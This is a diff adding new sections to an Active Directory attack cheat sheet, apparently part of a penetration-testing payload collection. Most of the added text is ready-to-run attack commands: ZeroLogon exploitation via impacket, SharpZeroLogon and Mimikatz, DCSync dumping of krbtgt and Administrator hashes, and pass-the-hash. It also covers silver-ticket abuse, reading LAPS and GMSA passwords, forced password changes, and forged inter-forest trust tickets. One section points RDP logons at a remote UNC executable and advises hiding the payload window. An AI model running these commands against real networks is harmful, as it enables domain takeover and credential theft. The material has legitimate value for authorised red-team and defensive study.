@@ -7,6 +7,7 @@
   - [Tools](#tools)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+    - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -48,9 +49,15 @@
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
+      	- [GenericWrite and Remote Connection Manager](#genericwrite-and-remote-connection-manager)
       - [WriteDACL](#writedacl)
+      - [WriteOwner](#writeowner)
+      - [ReadLAPSPassword](#readlapspassword)
+      - [ReadGMSAPassword](#readgmsapassword)
+      - [ForceChangePassword](#forcechangepassword)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
+    - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
@@ -268,6 +275,78 @@ Windows> net time /domain /set
 
 * Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
 
+### CVE-2020-1472 ZeroLogon
+
+White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
+
+Exploit steps from the white paper
+
+1. Spoofing the client credential
+2. Disabling signing and sealing
+3. Spoofing a call
+4. Changing a computer's AD password to null
+5. From password change to domain admin
+6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
+
+```powershell
+$ git clone https://github.com/dirkjanm/CVE-2020-1472.git
+
+# Activate a virtual env to install impacket
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ pip3 install .
+
+# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
+proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
+
+# Find the old NT hash of the DC
+proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
+
+# Restore password from secretsdump 
+# secretsdump will automatically dump the plaintext machine password (hex encoded) 
+# when dumping the local registry secrets on the newest version
+python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
+deactivate
+```
+
+in .NET for Cobalt Strike's execute-assembly
+
+```powershell
+git clone https://github.com/nccgroup/nccfsas
+# Check
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
+
+# Resetting the machine account password
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
+
+# Testing from a non Domain-joined machine
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
+
+# Now reset the password back
+```
+
+with Mimikatz : 2.2.0 20200917 Post-Zerologon
+
+```powershell
+privilege::debug
+# Check for the CVE
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
+
+# Exploit the CVE and set the computer account's password to ""
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
+
+# Execute dcsync to extract some hashes
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+
+# Pass The Hash with the extracted Domain Admin hash
+sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
+
+# Use IP address instead of FQDN to force NTLM with Windows APIs 
+# Reset password to Waza1234/Waza1234/Waza1234/
+# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
+lsadump::postzerologon /target:10.10.10.10 /account:DC01$
+```
 
 ### Open Shares
 
@@ -407,6 +486,8 @@ Get-NetGPOGroup
 ### Exploit Group Policy Objects GPO
 
 > Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+
+:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force. 
 
 ```powershell
 # Build and configure SharpGPOAbuse
@@ -722,7 +803,7 @@ Mitigations:
 
 ### Pass-the-Ticket Silver Tickets
 
-Forging a TGS require machine accound password (key) or NTLM hash from the KDC
+Forging a TGS require machine accound password (key) or NTLM hash of the service account.
 
 ```powershell
 # Create a ticket for the service
@@ -738,6 +819,19 @@ mimikatz $ misc::convert ccache ticket.kirbi
 root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
+
+Interesting services to target with a silver ticket :
+
+| Service Type                                | Service Silver Tickets | Attack |
+|---------------------------------------------|------------------------|--------|
+| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
+| PowerShell Remoting                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
+| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
+| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
+
 
 Mitigations:
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
@@ -879,7 +973,7 @@ or with the builtin Windows RDP and mimikatz
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
-You can extract the local SAM database to find the local administrator hash :
+You can extract the local **SAM database** to find the local administrator hash :
 
 ```powershell
 C:\> reg.exe save hklm\sam c:\temp\sam.save
@@ -1136,6 +1230,22 @@ Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
+##### GenericWrite and Remote Connection Manager
+
+> Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.
+>  
+> This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/
+
+:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
+
+```powershell
+$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
+$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
+$UserObject.TerminalServicesWorkDirectory = "C:\"
+$UserObject.SetInfo()
+```
+
+NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.
 
 #### WriteDACL
 
@@ -1147,6 +1257,49 @@ Import-Module .\PowerView.ps1
 $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+```
+
+#### WriteOwner
+
+An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).
+
+```powershell
+Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+
+This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
+
+
+#### ReadLAPSPassword
+
+An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module.
+
+```powershell
+Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
+
+
+#### ReadGMSAPassword
+
+An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.
+
+```powershell
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+```
+
+#### ForceChangePassword
+
+An attacker can change the password of the user this ACE applies to. 
+This can be achieved with Set-DomainUserPassword (PowerView module).
+
+```powershell
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 
@@ -1211,6 +1364,37 @@ Prerequisite:
     ```powershell
     kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
     ```
+
+### Forest to Forest Compromise - Trust Ticket
+
+#### Dumping trust passwords (trust keys)
+
+> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
+
+```powershell
+lsadump::trust /patch
+
+or find the TRUST_NAME$ machine account hash
+```
+
+#### Create a forged trust ticket (inter-realm TGT) using Mimikatz
+
+```powershell
+mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
+```
+
+#### Use the Trust Ticket file to get a TGS for the targeted service
+
+```powershell
+./asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
+```
+
+Inject the TGS file and access the targeted service with the spoofed rights.
+
+```powershell
+kirbikator lsa .\ticket.kirbi
+ls \\machine.domain.local\c$
+```
 
 ### Kerberos Unconstrained Delegation
 
@@ -1635,6 +1819,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
 * [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
 * [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
 * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
 * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
@@ -1685,3 +1870,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
 * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
+* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
+* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
